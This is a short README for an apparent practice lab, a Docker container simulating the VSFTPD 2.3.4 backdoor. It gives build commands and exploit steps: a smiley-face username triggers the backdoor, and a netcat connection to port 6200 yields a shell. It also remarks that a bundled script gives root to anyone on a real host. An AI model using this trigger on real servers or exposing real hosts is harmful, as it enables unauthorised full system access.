# VSFTPD Backdoor Container

This project implements a simulated VSFTPD server that allows the 2.3.4/5 backdoor vulnerability to be exploited.

## Hosting

This assumes you have a working docker install

build with `sudo docker build -t vsftpd:latest .`

then run `docker run -p 2121:21 -p 6200:6200 vsftpd:latest`

## Exploit

1. Connect to the server with an ftp client, e.g. `ftp localhost 21`
2. Provide a smiley face in the username, e.g. `user:)`
3. Provide any password
4. In a new terminal, initiate a connection to port 6200: `nc localhost 6200`
5. Congrats, shell achieved!

*Alternatively, just run the python script on your host machine. It will give everyone who triggers the backdoor root access to your system, but maybe that's what you're going for. Who am I to stop you?*